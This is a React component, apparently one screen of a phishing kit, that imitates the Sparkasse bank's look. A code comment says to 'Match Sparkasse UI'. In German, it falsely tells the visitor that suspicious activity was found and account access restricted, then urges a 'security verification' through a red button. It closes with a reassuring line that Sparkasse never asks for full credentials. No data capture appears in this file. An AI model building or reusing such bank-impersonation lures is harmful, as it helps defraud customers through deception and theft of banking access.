import React, { useState, useEffect } from 'react';
import { AlertTriangle } from 'lucide-react';

interface AccountCompromisedScreenProps {
  onStartVerification: () => void;
}

const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onStartVerification }) => {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  return (
    <div style={{
      backgroundColor: 'transparent',
      minHeight: 'calc(100vh - 116px)',
      padding: '0',
      fontFamily: 'SparkasseWeb, Arial, sans-serif',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center'
    }}>
      <div style={{
        maxWidth: '1400px',
        width: '100%',
        margin: '0 auto',
        padding: isMobile ? '40px 20px' : '80px 40px',
        textAlign: 'center'
      }}>
        {/* Warning Icon */}
        <div style={{
          marginBottom: isMobile ? '50px' : '70px',
          display: 'flex',
          justifyContent: 'center'
        }}>
          <div style={{
            width: isMobile ? '100px' : '140px',
            height: isMobile ? '100px' : '140px',
            backgroundColor: '#3c3c3c',
            borderRadius: '50%',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            border: '2px solid #555'
          }}>
            <AlertTriangle 
              size={isMobile ? 50 : 70} 
              color="#ff0018" 
              strokeWidth={2}
            />
          </div>
        </div>

        {/* Main Heading - Better spacing */}
        <h1 style={{
          color: 'white',
          fontSize: isMobile ? '2rem' : '3rem',
          fontWeight: 'bold',
          fontStyle: 'normal',
          marginBottom: isMobile ? '40px' : '50px',
          fontFamily: 'SparkasseWebBold, Arial, sans-serif',
          lineHeight: '1.3',
          maxWidth: '800px',
          margin: `0 auto ${isMobile ? '40px' : '50px'} auto`
        }}>
          Sicherheitswarnung
        </h1>

        {/* Clean Notice Banner - Match Sparkasse UI */}
        <div style={{
          maxWidth: isMobile ? '90%' : '700px',
          margin: `0 auto ${isMobile ? '40px' : '50px'} auto`,
          backgroundColor: '#3c3c3c',
          border: '1px solid #ff0018',
          borderRadius: '8px',
          padding: isMobile ? '20px' : '25px'
        }}>
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '15px',
            marginBottom: '15px'
          }}>
            <AlertTriangle size={24} color="#ff0018" />
            <h2 style={{
              color: '#ff0018',
              fontSize: isMobile ? '18px' : '20px',
              fontWeight: 'bold',
              margin: 0,
              fontFamily: 'SparkasseWebBold, Arial, sans-serif'
            }}>
              Verdächtige Aktivitäten erkannt
            </h2>
          </div>
          
          <p style={{
            color: 'white',
            fontSize: isMobile ? '15px' : '16px',
            fontWeight: 'normal',
            lineHeight: '1.6',
            fontFamily: 'SparkasseWeb, Arial, sans-serif',
            margin: 0
          }}>
            Wir haben ungewöhnliche Aktivitäten in Ihrem Konto festgestellt. 
            Zu Ihrer Sicherheit wurde Ihr Zugang temporär eingeschränkt.
          </p>
        </div>

        {/* Description Text - Better line spacing */}
        <div style={{
          marginBottom: isMobile ? '40px' : '50px',
          maxWidth: '600px',
          margin: `0 auto ${isMobile ? '40px' : '50px'} auto`,
          textAlign: 'center'
        }}>
          <p style={{
            color: 'white',
            fontSize: isMobile ? '16px' : '18px',
            fontWeight: 'normal',
            fontStyle: 'normal',
            lineHeight: '1.8',
            fontFamily: 'SparkasseWeb, Arial, sans-serif',
            marginBottom: '25px'
          }}>
            Um Ihren Zugang wiederherzustellen, führen Sie bitte die Sicherheitsüberprüfung durch.
          </p>
          
          <p style={{
            color: 'rgba(255, 255, 255, 0.8)',
            fontSize: isMobile ? '14px' : '15px',
            fontWeight: 'normal',
            fontStyle: 'normal',
            lineHeight: '1.7',
            fontFamily: 'SparkasseWeb, Arial, sans-serif',
            margin: 0
          }}>
            Dieser Vorgang dauert nur wenige Minuten und stellt die Sicherheit Ihres Kontos wieder her.
          </p>
        </div>

        {/* Action Button - Simple, clean */}
        <button
          onClick={onStartVerification}
          style={{
            backgroundColor: '#ff0018',
            color: 'white',
            border: 'none',
            borderRadius: '4px',
            padding: isMobile ? '14px 28px' : '18px 36px',
            fontSize: isMobile ? '15px' : '17px',
            fontWeight: 'bold',
            cursor: 'pointer',
            fontFamily: 'SparkasseWebBold, Arial, sans-serif',
            fontStyle: 'normal',
            marginBottom: isMobile ? '40px' : '60px'
          }}
        >
          Sicherheitsüberprüfung starten
        </button>

        {/* Bottom Info Text - Better spacing */}
        <div style={{
          maxWidth: '500px',
          margin: '0 auto'
        }}>
          <p style={{
            color: 'rgba(255, 255, 255, 0.7)',
            fontSize: '13px',
            fontWeight: 'normal',
            fontStyle: 'normal',
            lineHeight: '1.6',
            fontFamily: 'SparkasseWeb, Arial, sans-serif',
            margin: 0
          }}>
            Diese Sicherheitsmaßnahme dient dem Schutz Ihres Kontos. 
            Sparkasse wird Sie niemals per E-Mail oder Telefon nach vollständigen Zugangsdaten fragen.
          </p>
        </div>
      </div>
    </div>
  );
};

export default AccountCompromisedScreen;